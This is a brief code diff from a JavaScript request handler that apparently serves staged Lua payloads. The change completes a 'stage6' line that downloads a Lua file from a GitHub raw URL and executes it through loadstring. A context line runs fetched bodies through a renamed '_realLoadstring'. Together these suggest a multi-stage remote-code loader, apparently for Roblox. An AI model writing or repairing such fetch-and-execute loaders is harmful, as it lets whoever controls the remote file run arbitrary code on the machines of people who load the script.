@@ -184,7 +184,7 @@ export default async function handler(req, res) {
                 _realLoadstring(_next.Body)()
             `,
             "stage6": `
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/vexol-files/arch/refs/heads/main/unnamed.lua
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/vexol-files/arch/refs/heads/main/unnamed.lua"))()
             `
         };
 
